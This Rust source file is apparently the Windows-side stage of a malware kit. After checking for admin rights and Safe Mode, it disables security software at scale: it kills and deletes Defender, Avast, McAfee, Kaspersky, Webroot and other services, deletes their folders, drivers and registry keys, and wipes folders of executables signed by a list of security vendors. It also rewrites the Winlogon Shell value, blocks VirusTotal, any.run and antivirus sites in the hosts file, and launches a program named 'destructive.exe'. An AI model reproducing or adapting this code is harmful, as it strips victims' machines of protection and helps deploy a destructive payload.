use std::process::{Command, exit};
use std::io::{self, BufRead, BufReader, Write};
use std::path::{Path, PathBuf};
use std::collections::HashMap;
use std::env;
use wmi::{WMIConnection, COMLibrary};
use windows::Win32::System::SystemInformation::GetOsSafeBootMode;
use windows::Win32::Foundation::{BOOL, CloseHandle, HANDLE, INVALID_HANDLE_VALUE};
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_WRITE};
use winreg::RegKey;
use std::ffi::c_void;
use std::iter::once;
use std::ptr::null_mut;
use std::fs::{self, OpenOptions};
use windows::Win32::Security::Cryptography::{
    CertEnumCertificatesInStore, CertGetNameStringW,
    CertCloseStore, CryptQueryObject, CryptMsgClose,
    CERT_QUERY_OBJECT_FILE,
    CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
    CERT_QUERY_FORMAT_FLAG_BINARY,
    CERT_NAME_SIMPLE_DISPLAY_TYPE, HCERTSTORE
};
use windows::core::{Error, Result, PCWSTR};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ,
    FILE_SHARE_WRITE, OPEN_EXISTING, GetDriveTypeW, GetLogicalDrives,
};
use windows::Win32::System::IO::DeviceIoControl;

fn is_admin() -> bool {
    let output = Command::new("whoami")
        .arg("/groups")
        .output();

    match output {
        Ok(output) => {
            let output_str = String::from_utf8_lossy(&output.stdout);
            output_str.contains("S-1-5-32-544")  // SID for Administrators group
        },
        Err(_) => false,  // If the command fails, assume not admin
    }
}

fn execute_command(command: &str) {
    let status = Command::new("cmd")
        .args(&["/C", command])
        .status();

    match status {
        Ok(status) if status.success() => println!("[+] Command succeeded: {}", command),
        Ok(status) => eprintln!("[!] Command failed with status {}: {}", status, command),
        Err(e) => eprintln!("[!] Failed to execute command {}: {}", command, e),
    }
}

fn is_safe_mode() -> bool {
    let mut mode: u32 = 0;
    unsafe {
        if GetOsSafeBootMode(&mut mode as *mut u32) == BOOL(1) {
            // SAFEMODE_MINIMAL (1) or SAFEMODE_NETWORK (2) indicates Safe Mode
            mode == 1 || mode == 2
        } else {
            false
        }
    }
}

fn remove_antivirus_folder() -> Result<()> {
    // Initialize COM library.
    let com_lib = match COMLibrary::new() {
        Ok(lib) => lib,
        Err(e) => {
            eprintln!("Failed to initialize COM library: {}", e);
            return Err(Error::from_win32());
        }
    };

    // Establish WMI connection.
    let wmi_con = match WMIConnection::new(com_lib) {
        Ok(conn) => conn,
        Err(e) => {
            eprintln!("Failed to establish WMI connection: {}", e);
            return Err(Error::from_win32());
        }
    };

    // Query antivirus information.
    let query = "SELECT * FROM AntivirusProduct";
    let results: Vec<HashMap<String, String>> = match wmi_con.raw_query(query) {
        Ok(res) => res,
        Err(e) => {
            eprintln!("Failed to execute WMI query: {}", e);
            return Err(Error::from_win32());
        }
    };

    // Process results.
    for result in results {
        if let Some(path) = result.get("pathToSignedProductExe") {
            if let Some(folder_path) = std::path::Path::new(path).parent() {
                println!("Executable folder path: {}", folder_path.display());

                // Convert path to string.
                let folder_path_str = match folder_path.to_str() {
                    Some(s) => s,
                    None => {
                        eprintln!("Invalid folder path: {}", folder_path.display());
                        continue;
                    }
                };

                // Execute command to remove folder.
                let status = match std::process::Command::new("cmd")
                    .args(&["/C", "rd", "/s", "/q", folder_path_str])
                    .status()
                {
                    Ok(s) => s,
                    Err(e) => {
                        eprintln!("Error executing remove command: {}", e);
                        return Err(Error::from_win32());
                    }
                };

                if status.success() {
                    println!("Successfully removed the folder: {}", folder_path.display());
                } else {
                    eprintln!("Failed to remove the folder: {}", folder_path.display());
                }
            }
        }
    }

    Ok(())
}

fn modify_registry() -> io::Result<()> {
    // Open the registry key for Winlogon with write access
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);

    let winlogon_key = match hkcu.create_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
        KEY_WRITE,
    ) {
        Ok((key, _)) => key,
        Err(e) => {
            eprintln!("Failed to open or create registry key: {}", e);
            return Err(e);
        }
    };

    // Set the new "Shell" value
    let new_shell_value = r"%SystemRoot%\explorer.exe, cmd.exe /c start explorer.exe";

    match winlogon_key.set_value("Shell", &new_shell_value) {
        Ok(_) => {
            println!(
                "Registry modified successfully: Shell set to \"{}\".",
                new_shell_value
            );
        }
        Err(e) => {
            eprintln!("Failed to modify registry value: {}", e);
            return Err(e);
        }
    }

    Ok(())
}

/// List of antivirus signature substrings to search for in the certificate's subject.
const ANTIVIRUS_LIST: &[&str] = &[
    "System Healer Tech Sp.Zo.o",
    "Beijing Rising Information Technology Corporation Limited",
    "Filseclab Corporation",
    "Trend Micro, Inc.",
    "SUPERAntiSpyware.com",
    "Sophos Ltd",
    "ThreatTrack Security, Inc.",
    "IKARUS Security Software GmbH",
    "Quick Heal Technologies(Pvt) Ltd.",
    "Panda Security S.L",
    "Blue Coat Norway AS",
    "NANO Security Ltd",
    "McAfee, Inc.",
    "Glarysoft LTD",
    "Malwarebytes Corporation",
    "Kaspersky Lab",
    "K7 Computing Pvt Ltd",
    "SurfRight B.V.",
    "FRISK Software International",
    "Fortinet Technologies",
    "Emsisoft GmbH",
    "ESET, spol.s r.o.",
    "Doctor Web Ltd.",
    "Immunet Corporation",
    "Comodo Security Solutions",
    "G DATA Software AG",
    "BullGuard Ltd.",
    "Bitdefender SRL",
    "Avira Operations GmbH & Co.KG",
    "AVG Technologies CZ, s.r.o.",
    "AVAST Software s.r.o.",
    "Check Point Software Technologies Ltd.",
    "VIRUSBLOKADA ODO",
    "Qihoo 360 Software(Beijing) Company Limited",
    "Plumbytes Software Lp",
    "Bleeping Computer, LLC.",
    "Symantec Corporation",
    "AhnLab",
    "Baidu (China)",
    "Safer Networking Ltd.",
    "BrightFort LLC",
    "Gridinsoft, LLC",
    "Auslogics Labs Pty Ltd",
    "Datpol Janusz Siemienowicz",
    "Zemana Ltd.",
    "Piriform Ltd",
    "IObit Information Technology",
];

/// Retrieves the subject string from the first certificate embedded in the file.
/// This function uses CryptQueryObject to load the certificate store from the file
/// and then enumerates the first certificate to retrieve its subject using CertGetNameStringW.
/// Note that no validation is performed.
fn get_signature_subject(file_path: &str) -> Option<String> {
    // Convert the file path to a null-terminated wide string.
    let file_path_w: Vec<u16> = file_path.encode_utf16().chain(once(0)).collect();

    // Declare output variables.
    let mut encoding: u32 = 0;
    let mut content_type: u32 = 0;
    let mut format_type: u32 = 0;
    let mut cert_store = HCERTSTORE(null_mut());
    let mut msg: isize = 0; // HCRYPTMSG is represented as isize.

    // Call CryptQueryObject.
    let query_result = unsafe {
        CryptQueryObject(
            CERT_QUERY_OBJECT_FILE,
            file_path_w.as_ptr() as *const c_void,
            CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
            CERT_QUERY_FORMAT_FLAG_BINARY,
            0,
            Some(&mut encoding as *mut u32 as *mut _),
            Some(&mut content_type as *mut u32 as *mut _),
            Some(&mut format_type as *mut u32 as *mut _),
            Some(&mut cert_store),
            Some(&mut msg as *mut isize as *mut *mut c_void),
            None,
        )
    };

    // If CryptQueryObject fails, return None.
    if query_result.is_err() {
        return None;
    }

    // Enumerate the first certificate in the store.
    let p_cert_ctx = unsafe { CertEnumCertificatesInStore(cert_store, None) };
    if !p_cert_ctx.is_null() {
        let mut buf = [0u16; 256];
        // Call CertGetNameStringW with the buffer wrapped as a mutable slice.
        let name_len = unsafe {
            CertGetNameStringW(
                p_cert_ctx,
                CERT_NAME_SIMPLE_DISPLAY_TYPE,
                0,
                None,
                Some(&mut buf[..]),
            )
        };

        // name_len includes the terminating null; if greater than 1, we got a name.
        if name_len > 1 {
            let subject = String::from_utf16_lossy(&buf[..(name_len - 1) as usize]);
            unsafe {
                CertCloseStore(Some(cert_store), 0).ok();
                CryptMsgClose(if msg != 0 { Some(msg as *const c_void) } else { None }).ok();
            }
            return Some(subject);
        }
    }
    // Clean up if no certificate was found.
    unsafe {
        CertCloseStore(Some(cert_store), 0).ok();
        CryptMsgClose(if msg != 0 { Some(msg as *const c_void) } else { None }).ok();
    }
    None
}

/// Removes the entire folder containing the file at `file_path`.
fn remove_folder(file_path: &str) -> io::Result<()> {
    let path = Path::new(file_path);

    if let Some(parent) = path.parent() {
        println!("Deleting folder: {}", parent.display());

        match fs::remove_dir_all(parent) {
            Ok(_) => {
                println!("Successfully removed folder: {}", parent.display());
                Ok(())
            }
            Err(e) => {
                eprintln!("Failed to remove folder {}: {}", parent.display(), e);
                Err(e)
            }
        }
    } else {
        let err_msg = "Could not determine parent folder";
        eprintln!("{}", err_msg);
        Err(io::Error::new(io::ErrorKind::Other, err_msg))
    }
}

/// Scans the specified directory (non-recursively) for files.
/// For each file, it retrieves its certificate subject string (without validation)
/// and checks whether that subject contains any antivirus substring.
/// If a match is found, the folder containing that file is removed.
fn scan_directory(dir: &str) -> io::Result<()> {
    println!("Scanning directory: {}", dir);

    // Attempt to read the directory entries.
    let entries = match fs::read_dir(dir) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("Failed to read directory {}: {}", dir, e);
            return Err(e);
        }
    };

    // Iterate through the entries.
    for entry_result in entries {
        match entry_result {
            Ok(entry) => {
                let path = entry.path();

                if path.is_dir() {
                    // Recursively scan subdirectories.
                    if let Some(subdir) = path.to_str() {
                        // If an error occurs in a subdirectory, you can choose to handle or propagate it.
                        if let Err(e) = scan_directory(subdir) {
                            eprintln!("Error scanning subdirectory {}: {}", subdir, e);
                        }
                    } else {
                        eprintln!("Failed to convert directory path to string: {:?}", path);
                    }
                } else if path.is_file() {
                    // Check if the file has a ".exe" extension.
                    if let Some(ext) = path.extension() {
                        if ext.to_string_lossy().eq_ignore_ascii_case("exe") {
                            let file_path = path.to_string_lossy().to_string();

                            match get_signature_subject(&file_path) {
                                Some(subject) => {
                                    let subject_lower = subject.to_lowercase();
                                    for av in ANTIVIRUS_LIST {
                                        if subject_lower.contains(&av.to_lowercase()) {
                                            println!(
                                                "File {} has certificate subject matching antivirus: {}",
                                                file_path, subject
                                            );

                                            if let Err(e) = remove_folder(&file_path) {
                                                eprintln!("Failed to remove folder for {}: {}", file_path, e);
                                            }
                                            // If a match is found, break out of the antivirus loop.
                                            break;
                                        }
                                    }
                                }
                                None => {
                                    eprintln!("Failed to retrieve certificate subject for file: {}", file_path);
                                }
                            }
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("Error reading directory entry: {}", e);
            }
        }
    }
    Ok(())
}

const BLOCKED_DOMAINS: &[&str] = &[
    "virustotal.com", "hybrid-analysis.com", "hybridanalysis.com", "filescan.io", "360totalsecurity.com",
    "acronis.com", "adaware.com", "avast.com", "avira.com", "bitdefender.com", "clamav.net", "clamav.com",
    "comodo.com", "drweb.com", "emsisoft.com", "eset.com", "f-secure.com", "fortinet.com", "gdatasoftware.com",
    "hitmanpro.com", "ikarussecurity.com", "k7computing.com", "kaspersky.com", "malwarebytes.com",
    "mcafee.com", "norton.com", "pandasecurity.com", "sophos.com", "spyhunter.com", "superantispyware.com",
    "trendmicro.com", "vipre.com", "webroot.com", "zonealarm.com", "avg.com", "escanav.com", "totalav.com",
    "combofix.org", "adguard.com", "smadav.net", "smadav.ltd", "drweb.ru", "intego.com", "crowdstrike.com",
    "esetnod32.ru", "nictasoft.com", "jotti.org", "any.run", "tria.ge", "opswat.com"
];

/// Returns the path to the hosts file based on the `%SystemRoot%` environment variable.
fn get_hosts_path() -> PathBuf {
    // Attempt to get the system root; if not set, fallback to "C:\Windows"
    let system_root = env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
    let mut path = PathBuf::from(system_root);
    path.push("System32");
    path.push("drivers");
    path.push("etc");
    path.push("hosts");
    path
}

/// Modifies the hosts file by appending entries to block the domains in `BLOCKED_DOMAINS`.
fn modify_hosts_file() -> io::Result<()> {
    let hosts_path = get_hosts_path();
    println!("Using hosts file at: {}", hosts_path.display());

    // Open the hosts file for reading.
    let file = match OpenOptions::new().read(true).open(&hosts_path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to open hosts file for reading: {}", e);
            return Err(e);
        }
    };

    let reader = BufReader::new(file);

    // Read lines, ignoring any errors that occur while reading individual lines.
    let existing_lines: Vec<String> = reader
        .lines()
        .filter_map(|line| line.ok())
        .collect();

    // Collect domains that are already blocked.
    let existing_domains: Vec<String> = existing_lines.iter()
        .filter_map(|line| {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                None
            } else {
                let parts: Vec<&str> = trimmed.split_whitespace().collect();
                if parts.len() >= 2 && parts[0] == "127.0.0.1" {
                    Some(parts[1].to_string())
                } else {
                    None
                }
            }
        })
        .collect();

    let mut new_entries = Vec::new();
    // BLOCKED_DOMAINS is assumed to be defined elsewhere as something like:
    // const BLOCKED_DOMAINS: &[&str] = &["example.com", "another.com"];
    for &domain in BLOCKED_DOMAINS {
        if !existing_domains.contains(&domain.to_string()) {
            new_entries.push(format!("127.0.0.1 {}", domain));
        }
    }

    // If there are new entries to add, open the hosts file in append mode.
    if !new_entries.is_empty() {
        let mut file = match OpenOptions::new().append(true).open(&hosts_path) {
            Ok(f) => f,
            Err(e) => {
                eprintln!("Failed to open hosts file for appending: {}", e);
                return Err(e);
            }
        };

        for entry in new_entries {
            if let Err(e) = writeln!(file, "{}", entry) {
                eprintln!("Failed to write entry '{}': {}", entry, e);
                return Err(e);
            }
        }
        println!("Successfully added blocked domains to hosts file.");
    } else {
        println!("No new domains to add. Hosts file is already up-to-date.");
    }

    Ok(())
}

// CD-ROM drives have a drive type value of 5.
const DRIVE_CDROM: u32 = 5;

// IOCTL code to eject media from a device.
// Defined as:
//   #define IOCTL_STORAGE_EJECT_MEDIA CTL_CODE(IOCTL_STORAGE_BASE, 0x0202, METHOD_BUFFERED, FILE_READ_ACCESS)
// Numeric value: 0x2D4808.
const IOCTL_STORAGE_EJECT_MEDIA: u32 = 0x2D4808;

struct HandleGuard(HANDLE);

impl Drop for HandleGuard {
    fn drop(&mut self) {
        unsafe {
            if self.0 != INVALID_HANDLE_VALUE {
                if let Err(e) = CloseHandle(self.0) {
                    // Log the error instead of silently ignoring it.
                    eprintln!("Warning: Failed to close handle: {:?}", e);
                }
            }
        }
    }
}

/// Ejects the drive specified by its drive letter (for example, 'D').
/// Returns an error if the operation fails.
fn eject_drive(drive_letter: char) -> Result<()> {
    let device_path = format!("\\\\.\\{}:", drive_letter);
    let device_path_w: Vec<u16> = device_path.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        let handle: HANDLE = match CreateFileW(
            PCWSTR(device_path_w.as_ptr()),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None,
        ) {
            Ok(h) => h,
            Err(e) => {
                eprintln!("Failed to open handle for {}: {}", drive_letter, e);
                return Err(e);
            }
        };

        if handle == INVALID_HANDLE_VALUE {
            eprintln!("Invalid handle for drive {}:", drive_letter);
            return Err(Error::from_win32());
        }

        // Ensure the handle is closed properly
        let _handle_guard = HandleGuard(handle);

        let mut bytes_returned = 0u32;
        match DeviceIoControl(
            handle,
            IOCTL_STORAGE_EJECT_MEDIA,
            None,
            0,
            None,
            0,
            Some(&mut bytes_returned),
            None,
        ) {
            Ok(_) => {
                println!("Successfully ejected drive {}:", drive_letter);
                Ok(())
            }
            Err(e) => {
                eprintln!("Failed to eject drive {}: {}", drive_letter, e);
                Err(e)
            }
        }
    }
}

/// Enumerates all logical drives and attempts to eject those whose drive type is CD-ROM.
fn unplug_all_isos() -> Result<()> {
    unsafe {
        let drive_bits = GetLogicalDrives();
        if drive_bits == 0 {
            return Err(Error::from_win32());
        }

        // Iterate over drive letters A: through Z:
        for drive in b'A'..=b'Z' {
            let mask = 1 << (drive - b'A');
            if drive_bits & mask as u32 != 0 {
                let drive_letter = drive as char;
                // Build a drive root string (e.g. "D:\")
                let drive_path = format!("{}:\\", drive_letter);
                let drive_path_w: Vec<u16> =
                    drive_path.encode_utf16().chain(std::iter::once(0)).collect();
                // Determine the drive type.
                let drive_type = GetDriveTypeW(PCWSTR(drive_path_w.as_ptr()));
                if drive_type == DRIVE_CDROM {
                    if let Err(e) = eject_drive(drive_letter) {
                        eprintln!("Failed to eject drive {}: {:?}", drive_letter, e);
                    }
                }
            }
        }
    }
    Ok(())
}

/// For file deletion, this function takes ownership of the file, grants full control
/// to the current user, and then deletes it.  
/// The file_path parameter should be provided without surrounding quotes.
fn takeown_icacls_and_del(file_path: &str) {
    // Wrap the file path in quotes to handle spaces and special characters.
    let quoted_path = format!(r#""{}""#, file_path);

    // Build the commands.
    let takeown_cmd = format!(r#"takeown /f {}"#, quoted_path);
    let icacls_cmd = format!(r#"icacls {} /grant %USERNAME%:F"#, quoted_path);
    let del_cmd = format!(r#"del /f /q /a {}"#, quoted_path);

    // Execute the commands in sequence.
    execute_command(&takeown_cmd);
    execute_command(&icacls_cmd);
    execute_command(&del_cmd);
}

/// For directory deletion, this helper adds commands to take ownership,
/// grant full control, and then remove the directory.
fn add_takeown_and_delete(commands: &mut Vec<String>, directory: &str) {
    // Note: The directory path should already be quoted if needed.
    commands.push(format!(r#"takeown /f {} /r /d Y"#, directory));
    commands.push(format!(r#"icacls {} /grant %USERNAME%:F /t"#, directory));
    commands.push(format!(r#"rd /s /q {}"#, directory));
}

fn main() -> io::Result<()> {
    // Step 1: Admin Control Check
    if !is_admin() {
        eprintln!("You need administrator privileges to run this program.");
        exit(0); // Exit gracefully
    }

    // Check for Safe Mode before proceeding.
    if is_safe_mode() {
        println!("Safe Mode detected, proceeding with actions...");

        // Use a vector for commands that don’t involve file deletion.
        let mut commands: Vec<String> = Vec::new();

        // Group 2: Cleanup Safe Mode setting
        commands.push(r#"bcdedit /deletevalue {current} safeboot"#.to_string());

        // Group 3: Webroot services and files cleanup
        let webroot_service_cmds = vec![
            // Stop services
            "sc stop WRSkyClient",
            "sc stop WRCoreService",
            "sc stop WRSVC",
            // Delete services
            "sc delete WRSkyClient",
            "sc delete WRCoreService",
            "sc delete WRSVC",
        ];
        for cmd in webroot_service_cmds {
            commands.push(cmd.to_string());
        }

        // Instead of issuing raw del commands, use the helper for file deletion.
        if let Ok(system_root) = env::var("SystemRoot") {
            let wrkrn_sys = format!(r"{}\System32\Drivers\wrkrn.sys", system_root);
            let wruser_dll = format!(r"{}\System32\wruser.dll", system_root);
            takeown_icacls_and_del(&wrkrn_sys);
            takeown_icacls_and_del(&wruser_dll);
        }

        // Delete Webroot directories.
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Webroot""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Webroot""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramData%\WRCore""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramData%\WRData""#);

        // Group 4: Kaspersky directories cleanup
        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Kaspersky Lab""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Kaspersky Lab""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Kaspersky Lab""#);

        // Group 5: Avira directories cleanup
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Avira""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Avira""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Avira""#);

        // Group 6: McAfee directories cleanup
        add_takeown_and_delete(&mut commands, r#""%ProgramData%\McAfee""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\McAfee""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\McAfee""#);

        // Group 7: Windows Defender and Advanced Threat Protection cleanup
        // For file deletion, use the helper function.
        if let Ok(system_root) = env::var("SystemRoot") {
            let security_health = format!(r"{}\System32\SecurityHealthSystray.exe", system_root);
            takeown_icacls_and_del(&security_health);
        }
        // Delete Windows Defender directories.
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Windows Defender""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Windows Defender""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramData%\Microsoft\Windows Defender""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles%\Windows Defender Advanced Threat Protection""#);
        add_takeown_and_delete(&mut commands, r#""%ProgramFiles(x86)%\Windows Defender Advanced Threat Protection""#);

        // Group 8: Kill antivirus processes
        let kill_processes_cmds = vec![
            // AVAST
            "taskkill /F /IM AvastSvc.exe /T",
            "taskkill /F /IM AvastUI.exe /T",
            "taskkill /F /IM AvastWscReporter.exe /T",
            "taskkill /F /IM aswVmm.exe /T",
            // Malwarebytes
            "taskkill /F /IM MBAMService.exe /T",
            "taskkill /F /IM MsMpEng.exe /T",
            "taskkill /F /IM VSSERV.exe /T",
        ];
        for cmd in kill_processes_cmds {
            commands.push(cmd.to_string());
        }

        // Group 9: Stop antivirus services
        let stop_services_cmds = vec![
            // Avast
            "sc stop AvastSvc",
            "sc stop AvastWscReporter",
            "sc stop aswVmm",
            // Malwarebytes
            "sc stop MBAMService",
            // Windows Defender
            "sc stop WinDefend",
            "sc stop VSSERV",
            // McAfee
            r#"sc stop "McAfee Service Controller""#,
            r#"sc stop "McAfee Firewall Core Service""#,
            r#"sc stop "McAfee Validation Trust Protection""#,
        ];
        for cmd in stop_services_cmds {
            commands.push(cmd.to_string());
        }

        // Group 10: Delete antivirus services
        let delete_services_cmds = vec![
            // Avast
            "sc delete AvastSvc",
            "sc delete AvastWscReporter",
            "sc delete aswVmm",
            // Malwarebytes
            "sc delete MBAMService",
            // Windows Defender
            "sc delete WinDefend",
            "sc delete VSSERV",
            // McAfee
            r#"sc delete "McAfee Service Controller""#,
            r#"sc delete "McAfee Firewall Core Service""#,
            r#"sc delete "McAfee Validation Trust Protection""#,
        ];
        for cmd in delete_services_cmds {
            commands.push(cmd.to_string());
        }

        // Group 11: Delete registry keys for antivirus programs.
        // Group 11: Delete registry keys for antivirus programs
        let delete_registry_cmds = vec![
            // Startup keys
            r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f"#,
            // Avast-related keys
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbIDSAgent" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbIDSAgent" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswApPct" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswApPct" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsdriver" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsdriver" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbidsh" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbidsh" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswbuniv" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswbuniv" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswElam" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswElam" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswKbd" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswKbd" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswMonFit" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswMonFit" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswNetHub" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswNetHub" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRdr" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRdr" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\aswRvrt" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\aswRvrt" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\avast! Antivirus" /f"#,
            // Webroot keys
            r#"reg delete "HKLM\SOFTWARE\WOW6432Node\Webroot" /f"#,
            r#"reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WRUNINST" /f"#,
            r#"reg delete "HKLM\SOFTWARE\WRData" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\services\WRSVC" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\services\WRSVC" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\services\WRSVC" /f"#,
            // Windows Defender keys
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\WinDefend" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\WinDefend" /f"#,
            // Kaspersky 21.3 keys
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\AVP21.3" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\AVP21.3" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\AVP21.3" /f"#,
            // Malwarebytes keys
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\MBAMService" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\MBAMService" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\MBAMService" /f"#,
            // Bitdefender keys
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\VSSERV" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet001\Services\VSSERV" /f"#,
            r#"reg delete "HKLM\SYSTEM\ControlSet002\Services\VSSERV" /f"#,
            // ESET keys
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\eamonm" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\edevmon" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ehdrv" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekbdflt" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ekrn" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfw" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\epfwwfp" /f"#,
            r#"reg delete "HKLM\SYSTEM\CurrentControlSet\Services\ESETCleanersDriver" /f"#,
            // Avira key
            r#"reg delete HKLM\SOFTWARE\AVIRA /f"#,
        ];

        for cmd in delete_registry_cmds {
            commands.push(cmd.to_string());
        }

        // Execute all commands that were queued.
        for command in commands {
            execute_command(&command);
        }

        // Remove antivirus folder.
        if let Err(e) = remove_antivirus_folder() {
            eprintln!("Error removing antivirus folder: {}", e);
        }

        // Modify registry for explorer.exe.
        if let Err(e) = modify_registry() {
            eprintln!("Error modifying registry: {}", e);
        }

        // Remove antivirus folders from Program Files, Program Files (x86), and Program Data directories
        println!("Starting scan for antivirus software...");

        // Retrieve system directories from environment variables.
        let mut directories = Vec::new();
        if let Ok(prog_files) = env::var("ProgramFiles") {
            directories.push(prog_files);
        }
        if let Ok(prog_files_x86) = env::var("ProgramFiles(x86)") {
            directories.push(prog_files_x86);
        }
        if let Ok(program_data) = env::var("ProgramData") {
            directories.push(program_data);
        }

        // Scan each directory and handle errors properly.
        for dir in directories {
            if let Err(e) = scan_directory(&dir) {
                eprintln!("Error scanning directory {}: {}", dir, e);
            }
        }

        println!("Scan completed.");

        // Launch destructive.exe from the utkudrk2 folder.
        if let Ok(program_files) = env::var("ProgramFiles") {
            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
            let _ = Command::new(&executable_path).spawn(); // Ignore errors
        }

        if let Err(e) = modify_hosts_file() {
            eprintln!("Error modifying hosts file: {}", e);
        }

        if let Err(e) = unplug_all_isos() {
            eprintln!("Error unplugging ISOs: {}", e);
        }

        println!("[+] Cleanup tasks completed. Safe Mode should now be removed.");
    } else {
        println!("[+] Safe Mode is not detected. Running destructive.exe directly...");
        if let Ok(program_files) = env::var("ProgramFiles") {
            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
            let _ = Command::new(&executable_path).spawn(); // Ignore errors
        }
    }

    Ok(())
}
